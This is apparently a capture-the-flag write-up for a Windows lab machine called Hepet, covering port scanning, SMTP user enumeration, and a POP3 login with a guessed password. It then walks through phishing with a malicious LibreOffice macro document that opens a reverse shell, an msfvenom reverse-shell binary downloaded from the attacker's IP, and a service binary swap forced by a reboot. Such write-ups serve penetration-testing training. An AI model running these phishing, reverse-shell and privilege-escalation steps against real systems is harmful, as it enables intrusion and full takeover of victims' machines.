---
icon: windows
---

# Hepet - Intermediate

## <mark style="color:blue;">Gaining Access</mark>

Nmap scan:

```
# Nmap TCP
nmap -A -T4 -p- -Pn 192.168.231.140 -oN scans/nmap-tcpall
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-06 07:25 EDT
Nmap scan report for 192.168.231.140
Host is up (0.030s latency).
Not shown: 65513 closed tcp ports (reset)
PORT      STATE SERVICE        VERSION
25/tcp    open  smtp           Mercury/32 smtpd (Mail server account Maiser)
| smtp-commands: localhost Hello nmap.scanme.org; ESMTPs are:, TIME, SIZE 0, HELP
|_ Recognized SMTP commands are: HELO EHLO MAIL RCPT DATA RSET AUTH NOOP QUIT HELP VRFY SOML Mail server account is 'Maiser'.
79/tcp    open  finger         Mercury/32 fingerd
| finger: Login: Admin         Name: Mail System Administrator\x0D
| \x0D
|_[No profile information]\x0D
105/tcp   open  ph-addressbook Mercury/32 PH addressbook server
106/tcp   open  pop3pw         Mercury/32 poppass service
110/tcp   open  pop3           Mercury/32 pop3d
|_pop3-capabilities: APOP TOP USER EXPIRE(NEVER) UIDL
135/tcp   open  msrpc          Microsoft Windows RPC
139/tcp   open  netbios-ssn    Microsoft Windows netbios-ssn
143/tcp   open  imap           Mercury/32 imapd 4.62
|_imap-capabilities: IMAP4rev1 CAPABILITY complete X-MERCURY-1A0001 OK AUTH=PLAIN
443/tcp   open  ssl/http       Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1g PHP/7.3.23)
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1g PHP/7.3.23
|_http-title: Time Travel Company Page
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=localhost
| Not valid before: 2009-11-10T23:48:47
|_Not valid after:  2019-11-08T23:48:47
| tls-alpn: 
|_  http/1.1
445/tcp   open  microsoft-ds?
2224/tcp  open  http           Mercury/32 httpd
|_http-title: Mercury HTTP Services
5040/tcp  open  unknown
8000/tcp  open  http           Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1g PHP/7.3.23)
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: Time Travel Company Page
|_http-open-proxy: Proxy might be redirecting requests
|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1g PHP/7.3.23
11100/tcp open  vnc            VNC (protocol 3.8)
| vnc-info: 
|   Protocol version: 3.8
|   Security types: 
|_    Unknown security type (40)
20001/tcp open  ftp            FileZilla ftpd 0.9.41 beta
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| -r--r--r-- 1 ftp ftp            312 Oct 20  2020 .babelrc
| -r--r--r-- 1 ftp ftp            147 Oct 20  2020 .editorconfig
| -r--r--r-- 1 ftp ftp             23 Oct 20  2020 .eslintignore
| -r--r--r-- 1 ftp ftp            779 Oct 20  2020 .eslintrc.js
| -r--r--r-- 1 ftp ftp            167 Oct 20  2020 .gitignore
| -r--r--r-- 1 ftp ftp            228 Oct 20  2020 .postcssrc.js
| -r--r--r-- 1 ftp ftp            346 Oct 20  2020 .tern-project
| drwxr-xr-x 1 ftp ftp              0 Oct 20  2020 build
| drwxr-xr-x 1 ftp ftp              0 Oct 20  2020 config
| -r--r--r-- 1 ftp ftp           1376 Oct 20  2020 index.html
| -r--r--r-- 1 ftp ftp         425010 Oct 20  2020 package-lock.json
| -r--r--r-- 1 ftp ftp           2454 Oct 20  2020 package.json
| -r--r--r-- 1 ftp ftp           1100 Oct 20  2020 README.md
| drwxr-xr-x 1 ftp ftp              0 Oct 20  2020 src
| drwxr-xr-x 1 ftp ftp              0 Oct 20  2020 static
|_-r--r--r-- 1 ftp ftp            127 Oct 20  2020 _redirects
| ftp-syst: 
|_  SYST: UNIX emulated by FileZilla
|_ftp-bounce: bounce working!
33006/tcp open  mysql          MariaDB 10.3.24 or later (unauthorized)
49664/tcp open  msrpc          Microsoft Windows RPC
49665/tcp open  msrpc          Microsoft Windows RPC
49666/tcp open  msrpc          Microsoft Windows RPC
49667/tcp open  msrpc          Microsoft Windows RPC
49668/tcp open  msrpc          Microsoft Windows RPC
49669/tcp open  msrpc          Microsoft Windows RPC
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.95%E=4%D=10/6%OT=25%CT=1%CU=39395%PV=Y%DS=4%DC=T%G=Y%TM=68E3A80
OS:6%P=x86_64-pc-linux-gnu)SEQ(SP=101%GCD=1%ISR=107%TI=I%CI=I%TS=U)SEQ(SP=1
OS:04%GCD=1%ISR=108%TI=I%CI=I%TS=U)SEQ(SP=104%GCD=1%ISR=10C%TI=I%CI=I%TS=U)
OS:SEQ(SP=104%GCD=1%ISR=10F%TI=I%CI=I%TS=U)SEQ(SP=105%GCD=1%ISR=10B%TI=I%CI
OS:=I%TS=U)OPS(O1=M578NW0NNS%O2=M578NW0NNS%O3=M578NW0%O4=M578NW0NNS%O5=M578
OS:NW0NNS%O6=M578NNS)WIN(W1=4000%W2=4000%W3=4000%W4=4000%W5=4000%W6=4000)EC
OS:N(R=Y%DF=Y%T=80%W=4000%O=M578NW0NNS%CC=N%Q=)T1(R=Y%DF=Y%T=80%S=O%A=S+%F=
OS:AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T5(
OS:R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=80%W=0%S=A%A=O%
OS:F=R%O=%RD=0%Q=)T7(R=N)U1(R=Y%DF=N%T=80%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G
OS:%RUCK=G%RUD=G)IE(R=N)

Network Distance: 4 hops
Service Info: Host: localhost; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2025-10-06T11:29:02
|_  start_date: N/A
|_clock-skew: 3s

TRACEROUTE (using port 111/tcp)
HOP RTT      ADDRESS
1   29.08 ms 192.168.45.1
2   29.04 ms 192.168.45.254
3   29.10 ms 192.168.251.1
4   29.18 ms 192.168.231.140
```

### <mark style="color:$primary;">FTP Enumeration Port 20001</mark>

<figure><img src="../../.gitbook/assets/image (555).png" alt=""><figcaption></figcaption></figure>

I checked the config directory as well but I did not find any critical information

Also we do not have permission to put anything

### <mark style="color:$primary;">HTTP Port 2224 TCP</mark>

<figure><img src="../../.gitbook/assets/image (556).png" alt=""><figcaption></figcaption></figure>

Nothing to work with here either

### <mark style="color:$primary;">HTTP/S Port 8000 & 443 TCP</mark>

<figure><img src="../../.gitbook/assets/image (557).png" alt=""><figcaption></figcaption></figure>

SMTP is open on this machine and we have a list of employees available

<figure><img src="../../.gitbook/assets/image (560).png" alt=""><figcaption></figcaption></figure>

That phrase looks like a password, i am going to add it to a password list

### <mark style="color:$primary;">SMTP Enumeration Port 25 TCP</mark>

I extracted all the employee names and generated a list of usernames using [username-anarchy](https://github.com/urbanadventurer/username-anarchy)&#x20;

```
~/tools/username-anarchy/username-anarchy -i users | tee usernames
```

<figure><img src="../../.gitbook/assets/image (558).png" alt=""><figcaption></figcaption></figure>

I am going to use **`smtp-user-enum`** to see what is the valid username format

```
smtp-user-enum -M VRFY -U usernames -t 192.168.231.140
```

<figure><img src="../../.gitbook/assets/image (561).png" alt=""><figcaption></figcaption></figure>

5 valid SMTP users came back

I am going to try to access jonas email via pop3

### <mark style="color:$primary;">Pop3 Port 110 Enumeration</mark>

<figure><img src="../../.gitbook/assets/image (562).png" alt=""><figcaption></figcaption></figure>

jonas passphrase worked as the password! Let's check out the emails

<figure><img src="../../.gitbook/assets/image (563).png" alt=""><figcaption></figcaption></figure>

_“All the spreadsheets and documents will be first procesed in the mail server directly to check the compatibility.”_

The **mail server** is actively parsing or handling uploaded documents. We might be able to exploit this using macro injection

I'll send an email with a subject related to a spreadsheet or document to `mailadmin@localhost`. Since the latest mail server is confirmed to use LibreOffice, I need to craft a **malicious document in ODT or ODS format** containing a macro for a reverse shell.

### <mark style="color:$primary;">Phishing Abusing LibreOffice Macros</mark>&#x20;

To generate the malicious ODS document, I used the following [**tool**](https://github.com/0bfxgh0st/MMG-LO/)&#x20;

```
python3 ~/tools/macros/Libre_Office/MMG-LO/mmg-ods.py windows 192.168.45.158 80
```

<figure><img src="../../.gitbook/assets/image (565).png" alt=""><figcaption></figcaption></figure>

This will create a malicious file.ods that I will use for phishing

Now to create a message to send and attach the file to `mailadmin@localhost` using **Swaks**, authenticating with the email credentials of `jonas`.

```
swaks --to mailadmin@localhost --from jonas@localhost --attach @file.ods --server 192.168.231.140 --body @body --header "Subject: SpreadSheet Check"
```

<figure><img src="../../.gitbook/assets/image (566).png" alt=""><figcaption></figcaption></figure>

Wait for about a minute and you will received a reverse shell.

<figure><img src="../../.gitbook/assets/image (567).png" alt=""><figcaption></figcaption></figure>

## <mark style="color:blue;">Privilege Escalation</mark>

<figure><img src="../../.gitbook/assets/image (568).png" alt=""><figcaption></figcaption></figure>

We have the SeShutDownPrivilege we may be able to abuse this, if there is a Service we can hijack

### <mark style="color:$primary;">PowerUp.ps1 -> Service Binary Hijacking</mark>

<figure><img src="../../.gitbook/assets/image (569).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (571).png" alt=""><figcaption></figcaption></figure>

PowerUp also reveals Ela's password

<figure><img src="../../.gitbook/assets/image (570).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (572).png" alt=""><figcaption></figcaption></figure>

We found a service run by administrator that Ela has Full permissions on. We cannot restart it but that does not matter since we have SeShutdownPrivilege

I'll generate a reverse.exe binary and replace veyon-servce.exe with it&#x20;

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.158 LPORT=443 -f exe -o reverse.exe
```

<figure><img src="../../.gitbook/assets/image (573).png" alt=""><figcaption></figcaption></figure>

Now to uploaded the malicious binary to the target machine and **replace** the original `veyon-service.exe` with my payload

```
iwr http://192.168.45.158/reverse.exe -outfile reverse.exe
move "C:\Users\Ela Arwel\Veyon\veyon-service.exe" "C:\Users\Ela Arwel\Veyon\veyon-service.exe.bak"
move reverse.exe "C:\Users\Ela Arwel\Veyon\veyon-service.exe"
```

<figure><img src="../../.gitbook/assets/image (574).png" alt=""><figcaption></figcaption></figure>

Now to make sure I have a listener ready and to reboot the machine!

```
shutdown /r /t 0
```

<figure><img src="../../.gitbook/assets/image (575).png" alt=""><figcaption></figcaption></figure>

Now wait for the machine to reboot, and you will get a shell as the system user

<figure><img src="../../.gitbook/assets/image (2457).png" alt=""><figcaption></figcaption></figure>
